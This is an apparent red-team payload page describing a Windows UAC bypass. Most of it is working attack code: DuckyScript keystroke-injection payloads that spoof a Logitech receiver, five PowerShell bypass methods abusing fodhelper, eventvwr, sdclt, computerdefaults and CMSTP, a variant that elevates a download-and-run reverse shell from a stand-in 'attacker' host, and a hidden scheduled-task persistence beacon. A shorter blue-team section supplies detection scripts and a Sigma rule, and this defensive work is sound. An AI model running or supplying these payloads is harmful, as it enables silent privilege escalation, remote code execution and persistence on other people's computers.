# FZ-A02: UAC Bypass

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A02 |
| **Name** | UAC Bypass |
| **Difficulty** | Advanced |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~5 seconds |
| **MITRE ATT&CK** | T1548.002 (Bypass User Account Control) |

## What This Payload Does

Bypasses User Account Control (UAC) to execute commands with elevated privileges without triggering the UAC consent prompt. This allows administrative actions on systems where the user has local admin rights but UAC would normally block silent elevation.

---

## Understanding UAC

### UAC Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    UAC Decision Flow                         │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   Application Requests Elevation                              │
│              │                                                │
│              ▼                                                │
│   ┌─────────────────────┐                                    │
│   │ Is Auto-Elevation   │───Yes──► Execute Elevated          │
│   │ Allowed?            │         (No Prompt)                │
│   └─────────────────────┘                                    │
│              │ No                                             │
│              ▼                                                │
│   ┌─────────────────────┐                                    │
│   │ UAC Prompt Shown    │                                    │
│   │ User: Yes/No?       │                                    │
│   └─────────────────────┘                                    │
│         │           │                                         │
│        Yes         No                                         │
│         │           │                                         │
│         ▼           ▼                                         │
│   Execute        Access                                       │
│   Elevated       Denied                                       │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Auto-Elevation Conditions

Windows allows certain binaries to auto-elevate without UAC prompts:
- Binary is signed by Microsoft
- Binary is located in secure location (C:\Windows\)
- Binary manifest requests auto-elevation
- User has admin rights

---

## The Payload

```ducky
REM =============================================
REM ADVANCED: UAC Bypass via Fodhelper
REM Target: Windows 10/11
REM Action: Executes command as admin
REM Skill: Advanced
REM WARNING: Bypasses security control
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open PowerShell
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500

REM Fodhelper UAC Bypass
STRINGLN New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
STRINGLN New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "powershell -ep bypass -w hidden -c Start-Process cmd -ArgumentList '/c whoami > C:\Users\Public\admin.txt' -Verb RunAs" -Force
STRINGLN Start-Process "fodhelper.exe" -WindowStyle Hidden
DELAY 2000
REM Cleanup
STRINGLN Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
STRINGLN exit
```

---

## UAC Bypass Techniques

### Method 1: Fodhelper (Windows 10/11)

```powershell
# Fodhelper.exe auto-elevates and checks ms-settings registry
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd.exe /c your_command" -Force
Start-Process fodhelper.exe
```

### Method 2: ComputerDefaults (Windows 10)

```powershell
# Similar to fodhelper, uses ms-settings
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process computerdefaults.exe
```

### Method 3: Event Viewer (Eventvwr)

```powershell
# Event Viewer looks for mmc.exe in HKCU classes
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "cmd.exe" -Force
Start-Process eventvwr.exe
```

### Method 4: sdclt (Windows 10)

```powershell
# Sdclt.exe (Backup) auto-elevates
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value "cmd.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process sdclt.exe
```

### Method 5: CMSTP (Older Windows)

```powershell
# CMSTP can run INF files with elevated context
# Create INF file with payload
$inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
cmd.exe
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
"@
$inf | Out-File "$env:TEMP\bypass.inf"
Start-Process cmstp.exe -ArgumentList "/au $env:TEMP\bypass.inf"
```

---

## DuckyScript Variations

### Silent Reverse Shell Elevation

```ducky
DELAY 2500
GUI r
DELAY 500
STRING powershell -ep bypass -w hidden
ENTER
DELAY 1500
STRINGLN $cmd = "powershell -ep bypass -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')`""
STRINGLN New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
STRINGLN New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $cmd -Force
STRINGLN Start-Process fodhelper.exe -WindowStyle Hidden
STRINGLN Start-Sleep 3
STRINGLN Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### Persistence as Admin

```ducky
STRINGLN $persist = "schtasks /create /tn 'SystemUpdate' /tr 'powershell -w hidden -c beacon' /sc onlogon /rl highest /f"
STRINGLN New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
STRINGLN Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd /c $persist"
STRINGLN New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
STRINGLN Start-Process fodhelper.exe -WindowStyle Hidden
```

---

## Cross-Platform Considerations

### macOS

macOS doesn't have UAC. Privilege escalation uses:
- `sudo` (requires password)
- Authorization plugins
- Privilege escalation vulnerabilities

### Linux

Linux doesn't have UAC. Uses:
- `sudo` (requires password/configuration)
- PolicyKit
- Capability-based permissions

### Mobile Platforms

| Platform | Elevation Method |
|----------|------------------|
| Android | `su` binary (requires root) |
| iOS | Jailbreak required |

---

## Red Team Perspective

### When UAC Bypass Helps

| Scenario | Benefit |
|----------|---------|
| Silent payload execution | No popup alerts user |
| Credential dumping | LSASS requires SYSTEM/Admin |
| Persistence (HKLM) | Requires elevation |
| Service creation | Admin required |
| Driver installation | Admin required |

### Attack Chain

```
User Access → UAC Bypass → Elevated Commands → Full Compromise
                  ↑
              You are here
```

### Verification

```powershell
# Check if running elevated
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match "S-1-5-32-544")
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Registry Modifications**
   - HKCU\Software\Classes\ms-settings
   - HKCU\Software\Classes\mscfile
   - Sysmon Event ID 12/13

2. **Process Relationships**
   - fodhelper.exe spawning cmd/powershell
   - eventvwr.exe spawning unexpected children

3. **Auto-Elevation Abuse**
   - Trusted binaries with suspicious children

### Detection Script

```powershell
# Check for UAC bypass registry keys
$bypassPaths = @(
    "HKCU:\Software\Classes\ms-settings\shell\open\command",
    "HKCU:\Software\Classes\mscfile\shell\open\command",
    "HKCU:\Software\Classes\Folder\shell\open\command"
)

foreach ($path in $bypassPaths) {
    if (Test-Path $path) {
        Write-Warning "Potential UAC bypass key found: $path"
        Get-ItemProperty $path
    }
}
```

### Sigma Rule

```yaml
title: UAC Bypass via Registry Modification
status: experimental
description: Detects UAC bypass techniques using registry
logsource:
    product: windows
    category: registry_set
detection:
    selection:
        TargetObject|contains:
            - '\Software\Classes\ms-settings\shell\open\command'
            - '\Software\Classes\mscfile\shell\open\command'
            - '\Software\Classes\Folder\shell\open\command'
    condition: selection
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548.002
```

### Prevention

1. **UAC Settings**
   - Set to "Always Notify"
   - Remove local admin rights

2. **Registry Protection**
   - Monitor HKCU\Software\Classes modifications

3. **Application Control**
   - Prevent unauthorized binary execution

---

## Practice Exercises

### Exercise 1: Check UAC Level
```powershell
(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
# 0 = No prompt, 2 = Prompt on secure desktop, 5 = Prompt
```

### Exercise 2: Verify Elevation
```powershell
# Run after bypass to verify
whoami /groups | findstr "High Mandatory Level"
```

### Exercise 3: Cleanup
```powershell
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
```

---

## Payload File

Save as `FZ-A02_UAC_Bypass.txt`:

```ducky
REM FZ-A02: UAC Bypass (Fodhelper)
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -ep bypass -w hidden
ENTER
DELAY 1500
STRINGLN New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force;New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd /c whoami > C:\Users\Public\elevated.txt" -Force;Start-Process fodhelper.exe -WindowStyle Hidden;Start-Sleep 2;Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

---

[← FZ-A01 AMSI Bypass](FZ-A01_AMSI_Bypass.md) | [Back to Advanced](README.md) | [Next: FZ-A03 Credential Dumping →](FZ-A03_Credential_Dumping.md)
